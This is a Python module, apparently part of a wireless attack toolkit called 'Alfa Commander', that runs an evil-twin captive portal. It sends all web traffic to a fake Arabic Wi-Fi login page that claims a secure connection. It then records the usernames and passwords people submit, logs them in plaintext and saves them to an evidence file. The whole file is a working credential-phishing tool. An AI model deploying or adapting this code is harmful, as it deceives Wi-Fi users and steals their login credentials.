# ============================================================
# Alfa Commander - Captive Portal
# بوابة تصيد مع خادم HTTP
# ============================================================

from __future__ import annotations

import asyncio
import http.server
import json
import socket
import socketserver
import threading
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Callable, Optional
from urllib.parse import parse_qs, urlparse

from app.constants import EVIDENCE_DIR, TEMPLATES_DIR, CAPTIVE_PORTAL_TEMPLATES
from app.state import CapturedCredential, get_state
from app.logger import get_logger

logger = get_logger()


# ------------------------------------------------------------
# قالب HTML افتراضي
# ------------------------------------------------------------
DEFAULT_TEMPLATE = """<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تسجيل الدخول إلى الشبكة</title>
<style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
        font-family: -apple-system, "Segoe UI", Tahoma, sans-serif;
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        min-height: 100vh;
        display: flex; align-items: center; justify-content: center;
        padding: 20px;
    }
    .card {
        background: white; border-radius: 16px;
        padding: 40px; max-width: 400px; width: 100%;
        box-shadow: 0 20px 60px rgba(0,0,0,0.3);
    }
    .logo { text-align: center; font-size: 32px; margin-bottom: 10px; }
    h1 { font-size: 22px; margin-bottom: 8px; text-align: center; color: #333; }
    .subtitle { font-size: 14px; color: #666; text-align: center; margin-bottom: 30px; }
    .ssid { font-weight: bold; color: #667eea; }
    label { display: block; margin-bottom: 6px; font-size: 14px; color: #555; }
    input {
        width: 100%; padding: 12px 16px; margin-bottom: 16px;
        border: 2px solid #e1e1e1; border-radius: 8px;
        font-size: 15px; transition: border-color 0.2s;
    }
    input:focus { outline: none; border-color: #667eea; }
    button {
        width: 100%; padding: 14px; background: linear-gradient(135deg, #667eea, #764ba2);
        color: white; border: none; border-radius: 8px;
        font-size: 16px; font-weight: bold; cursor: pointer;
        transition: transform 0.1s;
    }
    button:active { transform: scale(0.98); }
    .footer { text-align: center; margin-top: 20px; font-size: 12px; color: #999; }
</style>
</head>
<body>
    <div class="card">
        <div class="logo">📶</div>
        <h1>تسجيل الدخول إلى الإنترنت</h1>
        <p class="subtitle">شبكة: <span class="ssid">%SSID%</span></p>
        <form method="POST" action="/login">
            <label for="username">اسم المستخدم</label>
            <input type="text" id="username" name="username" required autofocus>

            <label for="password">كلمة المرور</label>
            <input type="password" id="password" name="password" required>

            <button type="submit">اتصال</button>
        </form>
        <p class="footer">اتصال آمن ومشفر</p>
    </div>
</body>
</html>
"""


SUCCESS_TEMPLATE = """<!DOCTYPE html>
<html dir="rtl" lang="ar">
<head>
<meta charset="UTF-8">
<title>تم الاتصال</title>
<style>
    body { font-family: sans-serif; background: #f0f0f0;
           display: flex; align-items: center; justify-content: center;
           min-height: 100vh; margin: 0; }
    .card { background: white; padding: 40px; border-radius: 16px;
            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
    h1 { color: #28a745; }
</style>
</head>
<body>
    <div class="card">
        <h1>✓ تم الاتصال بنجاح</h1>
        <p>سيتم توجيهك إلى الإنترنت خلال لحظات...</p>
    </div>
</body>
</html>
"""


# ------------------------------------------------------------
# جلسة
# ------------------------------------------------------------
@dataclass
class CaptivePortalSession:
    session_id: str
    ssid: str
    port: int
    host: str = "0.0.0.0"
    template_path: Optional[Path] = None
    started_at: Optional[datetime] = None
    stopped_at: Optional[datetime] = None
    running: bool = False
    credentials_captured: int = 0
    clients_seen: set[str] = field(default_factory=set)


# ------------------------------------------------------------
# خادم HTTP
# ------------------------------------------------------------
class CaptivePortalHandler(http.server.BaseHTTPRequestHandler):
    """معالج HTTP لبوابة التصيد."""

    portal: "CaptivePortal" = None  # يُضبط من CaptivePortal

    def log_message(self, format, *args):
        # تجاهل السجلات الافتراضية
        pass

    def _get_client_ip(self) -> str:
        return self.client_address[0] if self.client_address else ""

    def do_GET(self):
        path = urlparse(self.path).path

        # كل الطلبات تُوجَّه إلى صفحة تسجيل الدخول (سلوك Captive Portal)
        self._serve_login_page()

    def do_POST(self):
        path = urlparse(self.path).path

        if path == "/login":
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode(errors="ignore")
            params = parse_qs(body)

            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            client_ip = self._get_client_ip()

            # تسجيل البيانات
            if CaptivePortalHandler.portal:
                CaptivePortalHandler.portal._handle_credentials(
                    username, password, client_ip
                )

            # صفحة النجاح
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(SUCCESS_TEMPLATE.encode("utf-8"))
        else:
            self.send_error(404)

    def _serve_login_page(self):
        portal = CaptivePortalHandler.portal
        if not portal:
            self.send_error(500)
            return

        html = portal._render_template()

        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Cache-Control", "no-cache")
        self.end_headers()
        self.wfile.write(html.encode("utf-8"))


# ------------------------------------------------------------
# البوابة
# ------------------------------------------------------------
class CaptivePortal:
    """
    بوابة تصيد كاملة:
    - خادم HTTP
    - قالب مخصص
    - تسجيل تلقائي في قاعدة البيانات
    """

    def __init__(
        self,
        ssid: str,
        port: int = 80,
        host: str = "0.0.0.0",
        template_path: Optional[Path] = None,
        on_credential: Optional[Callable[[CapturedCredential], None]] = None,
    ):
        self.ssid = ssid
        self.port = port
        self.host = host
        self.template_path = template_path
        self.on_credential = on_credential

        self.session = CaptivePortalSession(
            session_id=f"portal_{int(datetime.now().timestamp())}",
            ssid=ssid,
            port=port,
            host=host,
            template_path=template_path,
        )

        self._server: Optional[socketserver.TCPServer] = None
        self._thread: Optional[threading.Thread] = None
        self._html_template: str = ""

        # ربط المعالج
        CaptivePortalHandler.portal = self

    # ---------- التحميل ----------
    def _load_template(self):
        if self.template_path and self.template_path.exists():
            try:
                self._html_template = self.template_path.read_text(encoding="utf-8")
                return
            except Exception as e:
                logger.exception(f"فشل تحميل القالب: {e}")

        self._html_template = DEFAULT_TEMPLATE

    def _render_template(self) -> str:
        return self._html_template.replace("%SSID%", self.ssid)

    # ---------- التشغيل ----------
    def start(self) -> CaptivePortalSession:
        self._load_template()

        try:
            self._server = socketserver.TCPServer(
                (self.host, self.port),
                CaptivePortalHandler,
                bind_and_activate=False,
            )
            self._server.allow_reuse_address = True
            self._server.server_bind()
            self._server.server_activate()
        except OSError as e:
            logger.error(f"فشل تشغيل البوابة على المنفذ {self.port}: {e}")
            self.session.running = False
            raise

        self._thread = threading.Thread(
            target=self._server.serve_forever,
            daemon=True,
        )
        self._thread.start()

        self.session.started_at = datetime.now()
        self.session.running = True

        logger.info(
            f"بدء Captive Portal [{self.session.session_id}] "
            f"على {self.host}:{self.port} لـ SSID={self.ssid}"
        )
        return self.session

    def stop(self):
        if self._server:
            self._server.shutdown()
            self._server.server_close()
        self.session.running = False
        self.session.stopped_at = datetime.now()
        logger.info(f"إيقاف Captive Portal [{self.session.session_id}]")

    # ---------- معالجة البيانات ----------
    def _handle_credentials(self, username: str, password: str, client_ip: str):
        cred = CapturedCredential(
            ssid=self.ssid,
            username=username,
            password=password,
            client_mac=client_ip,
        )

        self.session.credentials_captured += 1
        self.session.clients_seen.add(client_ip)

        # تسجيل في الحالة العامة
        state = get_state()
        state.add_credential(cred)

        logger.warning(
            f"[CAPTURED] SSID={self.ssid} "
            f"user={username} pass={password} ip={client_ip}"
        )

        # حفظ في ملف
        self._save_to_file(cred)

        # استدعاء callback
        if self.on_credential:
            try:
                self.on_credential(cred)
            except Exception:
                logger.exception("خطأ في on_credential")

    def _save_to_file(self, cred: CapturedCredential):
        """حفظ البيانات في ملف JSON lines."""
        try:
            file = EVIDENCE_DIR / "captured_credentials.jsonl"
            file.parent.mkdir(parents=True, exist_ok=True)
            with open(file, "a", encoding="utf-8") as f:
                f.write(json.dumps({
                    "ssid": cred.ssid,
                    "username": cred.username,
                    "password": cred.password,
                    "client_mac": cred.client_mac,
                    "timestamp": cred.timestamp.isoformat(),
                }, ensure_ascii=False) + "\n")
        except Exception as e:
            logger.exception(f"فشل حفظ البيانات: {e}")

    # ---------- إحصاءات ----------
    def get_stats(self) -> dict:
        return {
            "session_id": self.session.session_id,
            "ssid": self.ssid,
            "running": self.session.running,
            "clients_seen": len(self.session.clients_seen),
            "credentials_captured": self.session.credentials_captured,
            "started_at": self.session.started_at.isoformat() if self.session.started_at else None,
        }


# ------------------------------------------------------------
# دالة مختصرة
# ------------------------------------------------------------
def start_captive_portal(
    ssid: str,
    port: int = 80,
    template: str = "generic",
) -> CaptivePortal:
    template_path = CAPTIVE_PORTAL_TEMPLATES.get(template)
    portal = CaptivePortal(
        ssid=ssid,
        port=port,
        template_path=template_path,
    )
    portal.start()
    return portal
